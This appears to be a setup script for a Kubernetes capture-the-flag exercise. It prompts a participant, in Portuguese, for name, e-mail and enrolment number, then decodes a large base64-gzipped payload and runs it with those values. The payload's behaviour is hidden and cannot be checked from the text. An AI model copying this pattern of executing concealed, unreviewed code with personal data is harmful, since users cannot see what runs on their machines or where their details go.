#!/usr/bin/env bash

set -euo pipefail

PAYLOAD='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'

echo
echo "========================================================"
echo "          KUBERNETES CAPTURE THE FLAG"
echo "========================================================"
echo
echo "--------------------------------------------------------"
echo "          IDENTIFICACAO DO PARTICIPANTE"
echo "--------------------------------------------------------"
echo
echo "Informe os mesmos dados que serao utilizados"
echo "no formulario de entrega do desafio."
echo

FIRST_NAME=""
EMAIL=""
REGISTRATION=""

if [ ! -r /dev/tty ]; then
    echo "[ERRO] Terminal interativo nao disponivel."
    exit 1
fi

printf "Primeiro nome: " > /dev/tty
IFS= read -r FIRST_NAME < /dev/tty

printf "E-mail:       " > /dev/tty
IFS= read -r EMAIL < /dev/tty

printf "Matricula:    " > /dev/tty
IFS= read -r REGISTRATION < /dev/tty

if [ -z "$FIRST_NAME" ] || \
   [ -z "$EMAIL" ] || \
   [ -z "$REGISTRATION" ]; then

    echo
    echo "[ERRO] Todos os campos sao obrigatorios."
    exit 1
fi

TMP_SCRIPT=$(mktemp)

cleanup() {
    rm -f "$TMP_SCRIPT"
}

trap cleanup EXIT

printf '%s' "$PAYLOAD" |
    base64 -d |
    gzip -dc > "$TMP_SCRIPT"

chmod 700 "$TMP_SCRIPT"

bash "$TMP_SCRIPT" \
    "$FIRST_NAME" \
    "$EMAIL" \
    "$REGISTRATION"